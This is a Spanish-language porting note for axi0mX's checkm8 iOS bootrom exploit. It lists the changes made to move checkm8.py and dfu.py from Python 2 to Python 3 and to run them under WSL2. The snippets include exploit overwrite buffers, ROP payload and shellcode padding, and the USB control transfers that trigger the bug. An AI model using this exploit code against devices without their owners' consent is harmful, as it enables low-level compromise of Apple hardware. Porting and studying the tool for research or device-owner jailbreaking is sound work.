# Notas del puerto: Python 2 → Python 3

El `checkm8.py` original de axi0mX es **Python 2**. Estos son los cambios exactos aplicados.

**Total: ~20 líneas. Ningún cambio de lógica del exploit.**

---

## 1. `print` statements → funciones

11 ocurrencias. Python 3 requiere paréntesis.

```python
# antes
print 'ERROR: Shellcode name "%s" does not end with known architecture. Exiting.' % name

# después
print('ERROR: Shellcode name "%s" does not end with known architecture. Exiting.' % name)
```

Líneas afectadas: 29, 103, 457, 458, 460, 464, 468, 470, 511, 513, 514

---

## 2. `str` → `bytes` (CRÍTICO)

Python 3 separa `str` (texto) de `bytes` (binario). El exploit manipula datos binarios.

### 2.1 Buffers de overwrite (7 líneas)

```python
# antes
s5l8947x_overwrite = '\0' * 0x660 + struct.pack('<20xI4x', 0x34000000)

# después
s5l8947x_overwrite = b'\x00' * 0x660 + struct.pack('<20xI4x', 0x34000000)
```

Líneas: 431-437

### 2.2 Construction del payload ROP (`usb_rop_callbacks`)

```python
# antes
data   = ''
block1 = ''
block2 = ''

# después
data   = b''
block1 = b''
block2 = b''
```

Líneas: 54, 56, 57

### 2.3 Padding de shellcode (9 ocurrencias)

```python
# antes
return s5l8947x_shellcode + '\0' * (PAYLOAD_OFFSET_ARMV7 - len(s5l8947x_shellcode)) + handler

# después
return s5l8947x_shellcode + b'\x00' * (PAYLOAD_OFFSET_ARMV7 - len(s5l8947x_shellcode)) + handler
```

### 2.4 Buffers del exploit (`'A' * 0xNNN`)

```python
# antes
libusb1_async_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 'A' * 0xC0, 0.00001)
libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001)

# después
libusb1_async_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, b'A' * 0xC0, 0.00001)
libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, b'A' * 0x800, 0.0001)
```

Líneas: 118, 490

---

## 3. `.decode('hex')` → `bytes.fromhex()`

```python
# antes
return '47000058E0001FD6'.decode('hex') + struct.pack('<Q', dest)

# después
return bytes.fromhex('47000058E0001FD6') + struct.pack('<Q', dest)
```

Línea: 84

---

## 4. División entera (BUG SILENCIOSO)

Este es el más peligroso porque **no lanza error** — produce un valor float donde se espera int.

```python
# antes (Python 2: división entera)
def asm_arm64_branch(src, dest):
  if src > dest:
    value = 0x18000000 - (src - dest) / 4     # py2: int
  else:
    value = 0x14000000 + (dest - src) / 4     # py2: int

# después (Python 3: / es float, // es entera)
def asm_arm64_branch(src, dest):
  if src > dest:
    value = 0x18000000 - (src - dest) // 4
  else:
    value = 0x14000000 + (dest - src) // 4
```

**Sin este cambio**: `struct.pack('<I', value)` falla con
`TypeError: required argument is not an integer` porque recibe un float.

⚠️ **Nota**: la línea 40 (`timeout / 1000.0`) SÍ debe ser división real — es una comparación de
tiempos, no un índice. No tocar.

---

## 5. Cambios en `dfu.py`

Reescrito para Python 3 + agregado re-anexado automático de USB/IP.

### 5.1 Bytes

```python
# antes
data = str()                              # py2: string vacío
data += ret.tostring()                    # método py2

# después
data = b''                                # py3: bytes vacío
data += bytes(ret)                        # conversión explícita
```

### 5.2 Backend de libusb

```python
# antes
backend = usb.backend.libusb1.get_backend(find_library=lambda x: libusbfinder.libusb1_path())

# después
backend = usb.backend.libusb1.get_backend()
```

En Linux, el libusb del sistema se encuentra solo. `libusbfinder` era necesario en Windows.

### 5.3 Re-anexado USB/IP (nuevo, específico de WSL)

```python
BUSID = "1-4"

def _reattach():
    """Windows suelta el dispositivo tras cada USB reset -> hay que re-attach.
    usbipd.exe es accesible desde WSL, asi que podemos automatizarlo."""
    try:
        subprocess.run(["usbipd.exe", "attach", "--wsl", "--busid", BUSID],
                       capture_output=True, timeout=15)
    except Exception:
        pass
```

Y en `acquire_device()`, si el dispositivo no aparece tras 1.5s, se llama `_reattach()`.

---

## 6. Reestructuración de `exploit()`

El exploit original hace 3 llamadas a `acquire_device()`, cada una requiriendo que el dispositivo
reaparezca tras un USB reset. En Linux nativo es instantáneo; en WSL2 requiere reconexión.

Se extrajo la lógica repetida a `_interactive_acquire()`:

```python
def _interactive_acquire(step, desc):
    """En WSL el USB reset del exploit desconecta el dispositivo de verdad.
    Re-attacheamos solos varias veces; si no vuelve, pedimos al usuario
    que desconecte/reconecte el cable (el iPhone vuelve solo a DFU)."""
    for attempt in range(1, 6):
        d = dfu.acquire_device(timeout=8.0, fatal=False)
        if d is not None:
            return d
    # ... pedir reconexión manual
```

**Nota**: esto es infraestructura, no lógica del exploit. El orden de las fases
(leak → overwrite → payload → verify) es idéntico al original.

---

## Verificación

```bash
python3 -m py_compile checkm8.py   # compila sin errores
python3 -m py_compile dfu.py       # compila sin errores
```

---

## Diff conceptual contra el original

```
+  20 líneas  portadas (print, bytes, hex, división)
+  ~30 líneas re-anexado USB/IP (nuevo, solo WSL)
+  ~25 líneas _interactive_acquire (nuevo, refactor)
-   0 líneas  de lógica del exploit cambiadas
```
